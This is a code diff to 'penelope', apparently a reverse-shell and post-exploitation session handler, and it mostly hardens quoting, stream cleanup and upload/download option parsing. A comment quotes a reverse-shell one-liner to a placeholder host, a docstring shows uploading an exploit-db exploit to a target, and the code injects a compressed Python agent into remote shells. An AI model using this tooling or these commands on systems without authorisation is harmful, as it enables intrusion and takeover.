@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.21.10"
+__version__ = "0.21.13"
 
 import os
 import io
@@ -88,6 +88,10 @@ sanitize_meta = lambda s: ''.join(c for c in s if c.isprintable()) if isinstance
 HTTP_CONTROL_CHAR_TABLE = {char: r'\x{:02x}'.format(char) for char in list(range(32)) + list(range(127, 160))}
 HTTP_CONTROL_CHAR_TABLE[ord('\\')] = r'\\'
 
+_REMOTE_PATH_VARIABLE = re.compile(
+	r'\$(?:([A-Za-z_][A-Za-z0-9_]*)|\{([A-Za-z_][A-Za-z0-9_]*)\})'
+)
+
 def Open(item, terminal=False):
 	if myOS != 'Darwin' and not DISPLAY:
 		logger.error("No available $DISPLAY")
@@ -127,31 +131,30 @@ def Open(item, terminal=False):
 		logger.error(f"Cannot open window: '{program}' binary does not exist")
 		return False
 
-	process = subprocess.Popen(
-		(program, *args),
-		stdin=subprocess.DEVNULL,
-		stdout=subprocess.DEVNULL,
-		stderr=subprocess.PIPE
-	)
+	with tempfile.TemporaryFile() as stderr_file:
+		process = subprocess.Popen(
+			(program, *args),
+			stdin=subprocess.DEVNULL,
+			stdout=subprocess.DEVNULL,
+			stderr=stderr_file
+		)
 
-	if not terminal:
 		try:
-			process.wait(timeout=2)
+			process.wait(timeout=.01 if terminal else 2)
 		except subprocess.TimeoutExpired:
+			if terminal:
+				stderr_file.seek(0)
+				error = stderr_file.read(1024)
+				if error:
+					logger.error(error.decode(errors="replace"))
+					return False
 			return True
 		if process.returncode != 0:
-			error = process.stderr.read().decode(errors="replace").strip()
+			stderr_file.seek(0)
+			error = stderr_file.read().decode(errors="replace").strip()
 			logger.error(f"Could not open '{item}'" + (f": {error}" if error else f" (exit code {process.returncode})"))
 			return False
 		return True
-
-	r, _, _ = select([process.stderr], [], [], .01)
-	if process.stderr in r:
-		error = os.read(process.stderr.fileno(), 1024)
-		if error:
-			logger.error(error.decode(errors="replace"))
-			return False
-	return True
 
 
 class Interfaces:
@@ -256,9 +259,8 @@ class Interfaces:
 
 class Table:
 
-	def __init__(self, list_of_lists=[], header=None, fillchar=" ", joinchar=" "):
-		self.list_of_lists = list_of_lists
-
+	def __init__(self, list_of_lists=None, header=None, fillchar=" ", joinchar=" "):
+		self.list_of_lists = [] if list_of_lists is None else list_of_lists
 		self.joinchar = joinchar
 
 		if type(fillchar) is str:
@@ -551,22 +553,21 @@ class HelpFormatter(RawTextHelpFormatter):
 
 
 class LineBuffer:
-	def __init__(self, length):
-		self.len = length
-		self.lines = deque(maxlen=self.len)
+	def __init__(self, maxlines):
+		self.lines = deque(maxlen=maxlines)
+		self.lock = threading.Lock()
 
 	def __lshift__(self, data):
 		if isinstance(data, str):
 			data = data.encode()
-		if self.lines and not self.lines[-1].endswith(b'\n'):
-			current_partial = self.lines.pop()
-		else:
-			current_partial = b''
-		self.lines.extend((current_partial + data).split(b'\n'))
+		with self.lock:
+			partial = self.lines.pop() if self.lines else b''
+			self.lines.extend((partial + data).rsplit(b'\n', self.lines.maxlen))
 		return self
 
 	def __bytes__(self):
-		return b'\n'.join(self.lines)
+		with self.lock:
+			return b'\n'.join(self.lines)
 
 def stdout(data, record=True):
 	try:
@@ -944,7 +945,7 @@ class MainMenu(BetterCMD):
 				f"{session_part}{paint('>').cyan_DIM} "
 		)
 
-	def session_operation(current=False, extra=[]):
+	def session_operation(current=False, extra=()):
 		def inner(func):
 			@wraps(func)
 			def newfunc(self, ID):
@@ -1098,7 +1099,7 @@ class MainMenu(BetterCMD):
 			except Exception as e:
 				logger.error(e)
 
-	@session_operation(extra=['none'])
+	@session_operation(extra=('none',))
 	def do_use(self, ID):
 		"""
 		[SessionID|none]
@@ -1129,13 +1130,13 @@ class MainMenu(BetterCMD):
 				return True
 		else:
 			if core.sessions:
-				for host, sessions in tuple(core.hosts.items()):
+				for host, sessions in core.hosts.items():
 					if not sessions:
 						continue
 					print('\n➤  ' + sessions[0].name_colored)
 					table = Table(joinchar=' | ')
 					table.header = [paint(header).cyan for header in ('ID', 'Shell', 'User', 'Source', 'Recv ↓', 'Sent ↑', 'Signal')]
-					for session in tuple(sessions):
+					for session in sessions:
 						if self.sid == session.id:
 							ID = paint('[' + str(session.id) + ']').red
 						elif session.new:
@@ -1176,7 +1177,7 @@ class MainMenu(BetterCMD):
 		"""
 		return core.sessions[ID].attach()
 
-	@session_operation(extra=['*'])
+	@session_operation(extra=('*',))
 	def do_kill(self, ID):
 		"""
 		[SessionID|*]
@@ -1198,7 +1199,7 @@ class MainMenu(BetterCMD):
 					if options.maintain > 1:
 						options.maintain = 1
 						self.onecmd("maintain")
-					for session in reversed(tuple(core.sessions.values())):
+					for session in reversed(list(core.sessions.values())):
 						session.kill()
 				else:
 					return False
@@ -1228,7 +1229,7 @@ class MainMenu(BetterCMD):
 			if core.forwardings:
 				table = Table(joinchar=' | ')
 				table.header = [paint(header).orange for header in ('ID', 'Session', 'Type', 'Local', 'Remote')]
-				for fwd in core.forwardings.values():
+				for fwd in list(core.forwardings.values()):
 					_type, lhost, lport, rhost, rport = fwd.info
 					table += [fwd.id, fwd.session.id, 'Local' if _type == 'L' else 'Remote',
 						f"{lhost}:{lport}", f"{rhost}:{rport}"]
@@ -1244,7 +1245,7 @@ class MainMenu(BetterCMD):
 				cmdlogger.warning("Specify a Port Forward ID (or *) to stop")
 				return False
 			if args[1] == '*':
-				forwardings = tuple(core.forwardings.values())
+				forwardings = list(core.forwardings.values())
 				if not forwardings:
 					cmdlogger.warning("No Port Forwards to stop...")
 					return False
@@ -1336,59 +1337,13 @@ class MainMenu(BetterCMD):
 			download /etc/cron*		Download multiple remote files and directories using glob
 			download /etc/issue /var/spool	Download multiple remote files and directories at once
 		"""
-		download_folder = None
-		remote_items = remote_items or ''
 		windows_paths = getattr(core.sessions[self.sid], 'OS', None) == 'Windows'
-
-		spans = []
-		start = None
-		quote = None
-		escaped = False
-		for i, char in enumerate(remote_items):
-			if start is None:
-				if char.isspace():
-					continue
-				start = i
-			if escaped:
-				escaped = False
-			elif char == '\\' and not windows_paths:
-				escaped = True
-			elif quote:
-				if char == quote:
-					quote = None
-			elif char in ('"' if windows_paths else "'\""):
-				quote = char
-			elif char.isspace():
-				spans.append((start, i))
-				start = None
-		if start is not None:
-			spans.append((start, len(remote_items)))
-
-		remove = None
-		for index, (begin, end) in enumerate(spans):
-			token = remote_items[begin:end]
-			if token == '--':
-				remove = (begin, end)
-				break
-			if token in ('-o', '--output') and index + 1 < len(spans):
-				folder_begin, folder_end = spans[index + 1]
-				folder = remote_items[folder_begin:folder_end]
-				try:
-					parts = shlex.split(folder, posix=True)
-				except ValueError:
-					parts = None
-				if parts and len(parts) == 1:
-					download_folder = parts[0]
-					remove = (begin, folder_end)
-				break
-		if remove:
-			begin, end = remove
-			remote_items = remote_items[:begin] + remote_items[end:]
+		remote_items, download_folder = parse_transfer_output(
+			remote_items, source_windows=windows_paths)
 
 		if download_folder is None and options.download_folder:
 			download_folder = options.download_folder
 		reroot = download_folder is not None
-		remote_items = remote_items.strip()
 		if remote_items:
 			core.sessions[self.sid].download(remote_items, download_folder=download_folder, reroot=reroot)
 		else:
@@ -1426,10 +1381,12 @@ class MainMenu(BetterCMD):
 	@session_operation(current=True)
 	def do_upload(self, local_items):
 		"""
-		<path|glob|URL>...
+		<path|glob|URL>... [-o|--output <remote folder>]
 		Upload local files, directories, or HTTP(S)/FTP URLs to the target
 		URLs are downloaded by Penelope and then uploaded to the target, allowing transfers when
 		the target has no direct Internet access.
+
+		-o <folder>   Upload into the remote <folder>
 
 		Examples:
 
@@ -1439,8 +1396,13 @@ class MainMenu(BetterCMD):
 			upload https://github.com/x/y/z.sh		  Download the file locally and then push it to the target
 			upload https://www.exploit-db.com/exploits/40611  Download the underlying exploit code locally and upload it to the target
 		"""
+		remote_folder = None
+		windows_destination = getattr(core.sessions[self.sid], 'OS', None) == 'Windows'
+		local_items, remote_folder = parse_transfer_output(
+			local_items, destination_windows=windows_destination)
 		if local_items:
-			core.sessions[self.sid].upload(local_items, randomize_fname=options.upload_random_suffix)
+			core.sessions[self.sid].upload(local_items, remote_path=remote_folder,
+				randomize_fname=options.upload_random_suffix)
 		else:
 			cmdlogger.warning("No files or directories specified")
 
@@ -1662,7 +1624,7 @@ class MainMenu(BetterCMD):
 
 			elif args.command == "stop":
 				if args.id == '*':
-					listeners = tuple(core.listeners.values())
+					listeners = list(core.listeners.values())
 					if listeners:
 						for listener in listeners:
 							listener.stop()
@@ -1679,7 +1641,7 @@ class MainMenu(BetterCMD):
 			if core.listeners:
 				table = Table(joinchar=' | ')
 				table.header = [paint(header).orange for header in ('ID', 'Type', 'Host', 'Port')]
-				for listener in core.listeners.values():
+				for listener in list(core.listeners.values()):
 					table += [listener.id, listener.__class__.__name__, listener.host, listener.port]
 				print('\n', indent(str(table), '  '), '\n', sep='')
 			else:
@@ -1714,7 +1676,7 @@ class MainMenu(BetterCMD):
 		"""
 		if core.listeners:
 			print()
-			for listener in core.listeners.values():
+			for listener in list(core.listeners.values()):
 				print(listener.payloads(line))
 		else:
 			cmdlogger.warning("No Listeners to show payloads")
@@ -1852,25 +1814,47 @@ class MainMenu(BetterCMD):
 	def complete_payloads(self, text, line, begidx, endidx):
 		return [iface for iface in Interfaces().list if iface.startswith(text)]
 
-	def complete_upload(self, text, line, begidx, endidx):
-		return self.complete_path(line, begidx, endidx, self._local_lister, expand=lambda p: os.path.expandvars(os.path.expanduser(p)))
+	def _complete_local_path(self, line, begidx, endidx):
+		return self.complete_path(line, begidx, endidx, self._local_lister,
+			expand=lambda p: os.path.expandvars(os.path.expanduser(p)), windows=(myOS == 'Windows'))
 
-	complete_script = complete_upload
-	complete_lcd = complete_upload
-
-	def complete_download(self, text, line, begidx, endidx):
-		# LOCAL path completion right after -o/--output, REMOTE paths otherwise
-		if re.search(r'(?:^|\s)(?:-o|--output)\s*$', line[:begidx]):
-			return self.complete_path(line, begidx, endidx, self._local_lister,
-				expand=lambda p: os.path.expandvars(os.path.expanduser(p)))
-		session = core.sessions.get(self.sid)
-		if session is None:
-			return []
+	def _complete_remote_path(self, line, begidx, endidx, session):
 		return self.complete_path(line, begidx, endidx, session.get_remote_completion,
 			windows=(session.OS == 'Windows'))
 
-	complete_open = complete_download
-	complete_cd = complete_download
+	def _complete_transfer(self, line, begidx, endidx, upload):
+		session = core.sessions.get(self.sid)
+		if session is None:
+			return []
+
+		local_windows = myOS == 'Windows'
+		remote_windows = session.OS == 'Windows'
+		completing_output = completing_transfer_output(
+			line, begidx,
+			source_windows=local_windows if upload else remote_windows,
+			destination_windows=remote_windows if upload else local_windows,
+		)
+		complete_remote = completing_output == upload
+		if complete_remote:
+			return self._complete_remote_path(line, begidx, endidx, session)
+		return self._complete_local_path(line, begidx, endidx)
+
+	def complete_upload(self, text, line, begidx, endidx):
+		return self._complete_transfer(line, begidx, endidx, upload=True)
+
+	def complete_script(self, text, line, begidx, endidx):
+		return self._complete_local_path(line, begidx, endidx)
+
+	complete_lcd = complete_script
+
+	def complete_download(self, text, line, begidx, endidx):
+		return self._complete_transfer(line, begidx, endidx, upload=False)
+
+	def complete_open(self, text, line, begidx, endidx):
+		session = core.sessions.get(self.sid)
+		return self._complete_remote_path(line, begidx, endidx, session) if session else []
+
+	complete_cd = complete_open
 
 	def complete_use(self, text, line, begidx, endidx):
 		return self.get_core_id_completion(text, "none")
@@ -2006,7 +1990,7 @@ class Core:
 	@property
 	def hosts(self):
 		result = {}
-		for session in tuple(self.sessions.values()):
+		for session in list(self.sessions.values()):
 			name = getattr(session, 'name', None)
 			if name:
 				result.setdefault(name, []).append(session)
@@ -2024,7 +2008,7 @@ class Core:
 	def sample_signals(self):
 		prev = {}
 		while self.started:
-			for session in tuple(self.sessions.values()):
+			for session in list(self.sessions.values()):
 				try:
 					sig = session.tcp_signal()
 					if sig is not None:
@@ -2088,7 +2072,7 @@ class Core:
 						continue
 					except OSError:
 						continue
-					if sum(1 for s in tuple(self.sessions.values()) if s.ip == endpoint[0]) >= options.max_sessions:
+					if sum(1 for s in list(self.sessions.values()) if s.ip == endpoint[0]) >= options.max_sessions:
 						_socket.close()
 						logger.debug(f"Rejected {endpoint}: max sessions per host ({options.max_sessions}) reached")
 						continue
@@ -2238,13 +2222,13 @@ class Core:
 
 		if self.sessions:
 			logger.warning("Killing sessions...")
-			for session in reversed(tuple(self.sessions.values())):
+			for session in reversed(list(self.sessions.values())):
 				session.kill()
 
-		for listener in tuple(self.listeners.values()):
+		for listener in list(self.listeners.values()):
 			listener.stop()
 
-		for fileserver in tuple(self.fileservers.values()):
+		for fileserver in list(self.fileservers.values()):
 			fileserver.stop()
 
 		self.control << (lambda: setattr(self, 'started', False))
@@ -3148,6 +3132,7 @@ class Session:
 			self.streamID = 0
 			self.streams = dict()
 			self.stream_lock = threading.Lock()
+			self._closing = False
 			self.stream_code = Messenger.STREAM_CODE
 			self.streams_max = 2 ** (8 * Messenger.STREAM_BYTES)
 
@@ -3279,7 +3264,7 @@ class Session:
 			return
 
 	def __bool__(self):
-		return self.socket.fileno() != -1 # and self.OS)
+		return not getattr(self, '_closing', False) and self.socket.fileno() != -1 # and self.OS)
 
 	def __repr__(self):
 		try:
@@ -3293,6 +3278,8 @@ class Session:
 	def __getattr__(self, name):
 		if name == 'new_streamID':
 			with self.stream_lock:
+				if getattr(self, '_closing', False):
+					return None
 				if len(self.streams) == self.streams_max:
 					logger.error("Too many open streams...")
 					return None
@@ -3314,6 +3301,13 @@ class Session:
 		else:
 			raise AttributeError(name)
 
+	def remove_stream(self, stream):
+		with self.stream_lock:
+			if self.streams.get(stream.id) is not stream:
+				return False
+			del self.streams[stream.id]
+			return True
+
 	def fileno(self):
 		return self.socket.fileno()
 
@@ -3325,7 +3319,8 @@ class Session:
 			else:
 				_bin = self.bin['python3'] or self.bin['python']
 				if _bin:
-					version = self.exec(f"{_bin} -V 2>&1 || {_bin} --version 2>&1", value=True)
+					_q = shlex.quote(_bin)
+					version = self.exec(f"{_q} -V 2>&1 || {_q} --version 2>&1", value=True)
 					try:
 						major, minor, micro = re.search(r"Python (\d+)\.(\d+)(?:\.(\d+))?", version).groups()
 					except Exception:
@@ -3444,9 +3439,7 @@ class Session:
 						logger.error(f"{directory}: Permission denied")
 						return False
 				else:
-					if directory.startswith('~'):
-						directory = self.exec(f"echo {directory}", value=True)
-					access = self.exec(f"[ -w \"{directory}\" ];echo $?", value=True)
+					access = self.exec(f"[ -w {shlex.quote(directory)} ];echo $?", value=True)
 					if not (isinstance(access, str) and access.strip().isdigit()):
 						logger.error(f"Cannot check write permissions for {directory}. Aborting...")
 						return None
@@ -3471,6 +3464,17 @@ class Session:
 			return None
 
 		return True
+
+	def resolve_remote_path(self, path):
+		if self.OS != 'Unix':
+			return path
+		resolved = self.exec(
+			f"_p={shell_expand_remote_path(path)} && "
+			f'case "$_p" in /*) cd "$_p";; *) cd {shlex.quote(self.cwd)} 2>/dev/null '
+			f'&& cd "$_p";; esac 2>/dev/null && pwd -P',
+			value=True
+		)
+		return resolved if isinstance(resolved, str) and resolved.startswith('/') else None
 
 	def get_remote_completion(self, text):
 		"""
@@ -3600,7 +3604,7 @@ class Session:
 				name = rand(10)
 				resolved = self.exec(
 					'for d in /dev/shm /tmp /var/tmp "$HOME" .; do '
-					f'echo x > "$d/{name}" 2>/dev/null && '
+					f'(echo x > "$d/{name}") 2>/dev/null && '
 					f'{{ (cd "$d" && pwd); rm -f "$d/{name}"; break; }}; done',
 					value=True)
 				self._tmp = resolved if (isinstance(resolved, str) and resolved.startswith("/")) else False
@@ -3893,7 +3897,7 @@ class Session:
 				def cleanup_allocated_streams():
 					for stream in allocated_streams:
 						stream.close()
-						self.streams.pop(stream.id, None)
+						self.remove_stream(stream)
 
 				if not stdin_stream:
 					stdin_stream = self.new_streamID
@@ -4024,7 +4028,7 @@ class Session:
 									closing.add(stdout_dst)
 							if not data:
 								rlist.remove(readable)
-								del self.streams[readable.id]
+								self.remove_stream(readable)
 
 						if readable is stderr_stream:
 							data = readable.read(options.network_buffer_size)
@@ -4040,7 +4044,7 @@ class Session:
 									closing.add(stderr_dst)
 							if not data:
 								rlist.remove(readable)
-								del self.streams[readable.id]
+								self.remove_stream(readable)
 					else:
 						continue
 					break
@@ -4051,7 +4055,7 @@ class Session:
 					pass
 				for stream in (stdin_stream, stdout_stream, stderr_stream):
 					stream.close()
-					self.streams.pop(stream.id, None)
+					self.remove_stream(stream)
 
 				return buffer.getvalue().rstrip().decode(errors="replace") if value else True
 			return None
@@ -4249,9 +4253,10 @@ class Session:
 		archive = self.need_binary("Standalone Python", URLS[url_key])
 		if not archive:
 			return False
+		q = shlex.quote(archive)
 		path = self.exec(
-			f'D="$(dirname "{archive}")" && tar -xzf "{archive}" -C "$D" 2>/dev/null && '
-			f'rm -f "{archive}" && '
+			f'D="$(dirname {q})" && tar -xzf {q} -C "$D" 2>/dev/null && '
+			f'rm -f {q} && '
 			f'"$D/python/bin/python3" -c "import sys;print(sys.executable)" 2>/dev/null',
 			value=True
 		)
@@ -4265,7 +4270,7 @@ class Session:
 		def make_dest():
 			if self.OS != "Unix":
 				return self.tmp
-			d = self.exec(f'mktemp -d -p "{self.exec_tmp}" 2>/dev/null', value=True)
+			d = self.exec(f'mktemp -d {shlex.quote(self.exec_tmp + "/XXXXXXXXXX")} 2>/dev/null', value=True)
 			if not (isinstance(d, str) and d.startswith("/")):
 				logger.error(f"Could not create a temp directory for {name}")
 				return None
@@ -4359,15 +4364,15 @@ class Session:
 					_exec = 'exec cmd in globals(), locals()'
 
 				agent = dedent('\n'.join(AGENT.splitlines()[1:])).format(
-					self.shell,
+					repr(self.shell),
 					options.network_buffer_size,
 					MESSENGER,
 					STREAM,
-					self.bin['sh'] or self.bin['bash'],
+					repr(self.bin['sh'] or self.bin['bash']),
 					_exec
 				)
 				payload = base64.b64encode(zlib.compress(agent.encode(), 9)).decode()
-				cmd = f'{_bin} -Wignore -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")))\''
+				cmd = f'{shlex.quote(_bin)} -Wignore -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")))\''
 
 				if self.pty_ready:
 					self.exec("stty -echo")
@@ -4378,12 +4383,12 @@ class Session:
 					# For example: <?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
 					# Silently convert the shell to non-interactive before PTY upgrade.
 					self.interactive = False
-					self.exec(f"exec {self.shell}", raw=True, timeout=max(self.latency or 0, 0.5))
+					self.exec(f"exec {shlex.quote(self.shell)}", raw=True, timeout=max(self.latency or 0, 0.5))
 					self.echoing = False
 
 				shell_marker = struct.pack(Messenger._TYPE_CODE, Messenger.SHELL)
 				response = self.exec(
-					f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}',
+					f'export TERM=xterm-256color; export SHELL={shlex.quote(self.shell)}; {cmd}',
 					separate=True,
 					expect_func=lambda data: shell_marker in data,
 					raw=True
@@ -4706,8 +4711,11 @@ class Session:
 					dec = codecs.getincrementaldecoder('utf-8')(errors='replace')
 					error_buffer = ''
 					while True:
-						r, _, _ = select([stderr_stream], [], [])
-						data = stderr_stream.read(options.network_buffer_size)
+						try:
+							select([stderr_stream], [], [])
+							data = stderr_stream.read(options.network_buffer_size)
+						except (OSError, ValueError):
+							break
 						if data:
 							error_buffer += dec.decode(data)
 							while '\n' in error_buffer:
@@ -4728,9 +4736,19 @@ class Session:
 					return []
 				temp = remote_tmp + "/" + rand(8)
 				qtemp = shlex.quote(temp)
+				self.uploaded_paths[qtemp] = int(time.time())
+				def remove_remote_download_temp():
+					if not self:
+						return False
+					removed = self.exec(f"rm -f -- {qtemp}; echo $?", value=True)
+					if isinstance(removed, str) and removed.strip() == "0":
+						self.uploaded_paths.pop(qtemp, None)
+						return True
+					return False
 				cmd = rf'tar -czf - {"-h " if options.link_dereference else ""}{remote_items}|base64|tr -d "\n" > {qtemp}'
 				response = self.exec(cmd, timeout=None, value=True)
 				if response is False:
+					remove_remote_download_temp()
 					logger.error("Cannot create archive")
 					return []
 				errors = [line[5:] for line in response.splitlines() if line.startswith('tar: /')]
@@ -4743,6 +4761,7 @@ class Session:
 					value=True
 				)
 				if not (isinstance(send_size, str) and send_size.strip().isdigit()):
+					remove_remote_download_temp()
 					logger.error("Could not determine the remote file size")
 					return []
 				send_size = int(send_size)
@@ -4755,12 +4774,13 @@ class Session:
 					if response is False:
 						pbar.terminate()
 						logger.error("Download interrupted")
-						if self:
-							self.exec(f"rm {qtemp}")
+						if not remove_remote_download_temp():
+							logger.warning(f"Remote temporary file may remain: {temp}")
 						return []
 					b64data.write(response)
 					pbar.update(len(response))
-				self.exec(f"rm {qtemp}")
+				if not remove_remote_download_temp():
+					logger.warning(f"Remote temporary file may remain: {temp}")
 
 				try:
 					raw = base64.b64decode(b64data.getvalue())
@@ -4773,9 +4793,34 @@ class Session:
 				del raw
 
 			# Local extraction
+			def cleanup_agent_download():
+				if not self.agent:
+					return True
+				for action in (
+					lambda: stdin_stream.write(b""),
+					stdin_stream.close_read, stdin_stream.close_write,
+					stdout_stream.close_read,
+				):
+					try:
+						action()
+					except Exception:
+						pass
+				stderr_thread.join(timeout=2)
+				try:
+					stderr_stream.close_read()
+				except Exception:
+					pass
+				if stderr_thread.is_alive():
+					stderr_thread.join(timeout=2)
+				cleanup_complete = not stderr_thread.is_alive()
+				for stream in (stdin_stream, stdout_stream, stderr_stream):
+					self.remove_stream(stream)
+				return cleanup_complete
+
 			try:
 				tar = tarfile.open(mode=mode, fileobj=tar_source, bufsize=options.network_buffer_size)
 			except Exception:
+				cleanup_agent_download()
 				logger.error("Invalid data returned")
 				return []
 
@@ -4790,29 +4835,32 @@ class Session:
 					return data
 				tar.fileobj.read = _read_pbar
 
+			extraction_error = None
+			cleanup_complete = True
 			try:
 				extracted = safe_tar_extractall(tar, local_download_folder, streaming=self.agent, strip_prefixes=strip_prefixes)
 			except Exception as e:
+				extraction_error = e
 				if pbar:
 					pbar.terminate()
 				logger.debug(traceback.format_exc())
 				logger.error(str(paint("<LOCAL>").yellow) + " " + str(paint(e).red))
+				logger.warning("Download failed; partially extracted local files may remain")
+			finally:
+				try:
+					tar.close()
+				finally:
+					cleanup_complete = cleanup_agent_download()
+			if extraction_error:
+				return []
+			if not cleanup_complete:
+				logger.error("Download stream cleanup timed out; outcome is indeterminate")
 				return []
 
 			if pbar:
 				pbar.update(pbar.end)
-			tar.close()
 
 			if self.agent:
-				stderr_thread.join()
-				stdin_stream.write(b"")
-				stdin_stream.close_read()
-				stdin_stream.close_write()
-				del self.streams[stdin_stream.id]
-				stdout_stream.close_read()
-				del self.streams[stdout_stream.id]
-				del self.streams[stderr_stream.id]
-
 				# Get the remote absolute paths
 				response = self.exec(f"""
 				from glob import glob
@@ -4824,25 +4872,29 @@ class Session:
 					if result:
 						for item in result:
 							if os.path.exists(item):
-								remote_paths += os.path.abspath(item) + "\\n"
+								remote_paths += "1\\t" + os.path.abspath(item) + "\\n"
 					else:
-						remote_paths += part + "\\n"
+						remote_paths += "0\\t" + part + "\\n"
 				stdout_stream << remote_paths.encode()
 				""", python=True, value=True)
 			else:
 				cmd = (
-					'_abspath(){ if [ -d "$1" ]; then (cd "$1" && pwd);'
-					' else echo "$(cd "$(dirname "$1")" && pwd)/$(basename "$1")"; fi; };'
 					f' for file in {remote_items}; do if [ -e "$file" ]; then'
-					' readlink -f "$file" 2>/dev/null || _abspath "$file";'
-					' else echo "$file"; fi; done'
+					' printf "1\\t%s\\n" "$file";'
+					' else printf "0\\t%s\\n" "$file"; fi; done'
 				)
 				response = self.exec(cmd, timeout=None, value=True)
 				if not response:
 					logger.error("Cannot get remote paths")
 					return []
 
-			remote_paths = response.splitlines()
+			remote_results = []
+			for line in response.splitlines():
+				status, separator, path = line.partition('\t')
+				if separator and status in ('0', '1'):
+					remote_results.append((status == '1', path))
+				else:
+					remote_results.append((True, line))
 
 			# Present the downloads
 			downloaded = []
@@ -4850,10 +4902,16 @@ class Session:
 				base = os.path.realpath(local_download_folder)
 				tops = {os.path.relpath(p, base).split(os.sep)[0] for p in extracted}
 				downloaded = [local_download_folder / t for t in sorted(tops)]
+				downloaded_names = {path.name for path in downloaded}
+				for exists, path in remote_results:
+					name = os.path.basename(path.rstrip('/'))
+					if not exists or (name and name not in downloaded_names):
+						logger.error(f"{paint('Download Failed').RED_white} {shlex.quote(path)}")
 			else:
-				for path in remote_paths:
+				extracted_realpaths = {os.path.realpath(item) for item in extracted}
+				for exists, path in remote_results:
 					local_path = local_download_folder / path[1:]
-					if os.path.isabs(path) and os.path.exists(local_path):
+					if exists and os.path.isabs(path) and os.path.realpath(local_path) in extracted_realpaths:
 						downloaded.append(local_path)
 					else:
 						logger.error(f"{paint('Download Failed').RED_white} {shlex.quote(path)}")
@@ -4921,6 +4979,11 @@ class Session:
 
 		url_to_bytes_fn = url_to_bytes_fn or url_to_bytes
 		destination = remote_path or self.cwd
+		if self.OS == 'Unix':
+			destination = self.resolve_remote_path(destination)
+			if not destination:
+				logger.error(f"Cannot resolve remote destination: {remote_path or self.cwd}")
+				return []
 
 		if not self.write_access(destination):
 			return []
@@ -5040,8 +5103,40 @@ class Session:
 				stdin_stream = self.new_streamID
 				stdout_stream = self.new_streamID
 				stderr_stream = self.new_streamID
+				agent_streams = tuple(stream for stream in (stdin_stream, stdout_stream, stderr_stream) if stream)
+				monitor_thread = None
+				upload_eof_sent = False
+
+				def cleanup_agent_upload(wait_for_remote=True):
+					nonlocal upload_eof_sent
+					if stdin_stream and not upload_eof_sent:
+						try:
+							stdin_stream.write(b"")
+						except Exception:
+							pass
+						upload_eof_sent = True
+
+					if wait_for_remote and monitor_thread:
+						while monitor_thread.is_alive() and self:
+							monitor_thread.join(timeout=0.25)
+
+					for stream in agent_streams:
+						for close in (stream.close_read, stream.close_write):
+							try:
+								close()
+							except Exception:
+								pass
+
+					if monitor_thread and monitor_thread.is_alive():
+						monitor_thread.join(timeout=2)
+					cleanup_complete = not (monitor_thread and monitor_thread.is_alive())
+
+					for stream in agent_streams:
+						self.remove_stream(stream)
+					return cleanup_complete
 
 				if not all([stdin_stream, stdout_stream, stderr_stream]):
+					cleanup_agent_upload(wait_for_remote=False)
 					return []
 
 				code = rf"""
@@ -5116,9 +5211,15 @@ class Session:
 							watch.append(stdout_stream)
 						if err_open:
 							watch.append(stderr_stream)
-						readable, _, _ = select(watch, [], [])
+						try:
+							readable, _, _ = select(watch, [], [])
+						except (OSError, ValueError):
+							break
 						if stdout_stream in readable:
-							data = stdout_stream.read(options.network_buffer_size)
+							try:
+								data = stdout_stream.read(options.network_buffer_size)
+							except (OSError, ValueError):
+								data = b''
 							if data:
 								out_buf += data
 								while b'\n' in out_buf:
@@ -5129,7 +5230,10 @@ class Session:
 							else:
 								out_open = False
 						if stderr_stream in readable:
-							data = stderr_stream.read(options.network_buffer_size)
+							try:
+								data = stderr_stream.read(options.network_buffer_size)
+							except (OSError, ValueError):
+								data = b''
 							if data:
 								err_buf += data
 								while b'\n' in err_buf:
@@ -5148,62 +5252,64 @@ class Session:
 				tar_buffer = io.BytesIO()
 				tar_destination, mode = tar_buffer, "r:gz"
 
+			level = self.compression_level if self.agent else 6
 			_compression = {}
-			if self.agent and sys.version_info >= (3, 12):
-				_compression['compresslevel'] = self.compression_level
-			tar = tarfile.open(mode='w|gz', fileobj=tar_destination, dereference=options.link_dereference,
-				bufsize=options.network_buffer_size, **_compression)
-			if self.agent and not _compression:
-				tar.fileobj.cmp = zlib.compressobj(self.compression_level, zlib.DEFLATED, -zlib.MAX_WBITS, zlib.DEF_MEM_LEVEL, 0)
+			if sys.version_info >= (3, 12):
+				_compression['compresslevel'] = level
+			altnames = []
+			try:
+				tar = tarfile.open(mode='w|gz', fileobj=tar_destination, dereference=options.link_dereference,
+					bufsize=options.network_buffer_size, **_compression)
+				if not _compression:
+					tar.fileobj.cmp = zlib.compressobj(level, zlib.DEFLATED, -zlib.MAX_WBITS, zlib.DEF_MEM_LEVEL, 0)
 
-			def handle_exceptions(func):
-				def inner(*args, **kwargs):
+				for item in resolved_items:
 					try:
-						func(*args, **kwargs)
+						if isinstance(item, tuple):
+							filename, data = item
+
+							if randomize_fname:
+								filename = Path(filename)
+								altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
+							else:
+								altname = filename
+
+							file = tarfile.TarInfo(name=altname)
+							file.size = len(data)
+							file.mode = 0o770
+							file.mtime = int(time.time())
+
+							tar.addfile(file, io.BytesIO(data))
+						else:
+							altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
+							tar.add(item, arcname=altname)
 					except Exception as e:
 						logger.error(str(paint("<LOCAL>").yellow) + " " + str(paint(e).red))
-				return inner
-			tar.add = handle_exceptions(tar.add)
-
-			altnames = []
-			for item in resolved_items:
-				if isinstance(item, tuple):
-					filename, data = item
-
-					if randomize_fname:
-						filename = Path(filename)
-						altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
-					else:
-						altname = filename
-
-					file = tarfile.TarInfo(name=altname)
-					file.size = len(data)
-					file.mode = 0o770
-					file.mtime = int(time.time())
-
-					tar.addfile(file, io.BytesIO(data))
-				else:
-					altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
-					tar.add(item, arcname=altname)
-				altnames.append(altname)
-			tar.close()
+						continue
+					altnames.append(altname)
+				tar.close()
+			except Exception as e:
+				logger.error(str(paint("<LOCAL>").yellow) + " " + str(paint(e).red))
+				if self.agent:
+					cleanup_agent_upload()
+				return []
 
 			if self.agent:
-				stdin_stream.write(b"")
-				monitor_thread.join()
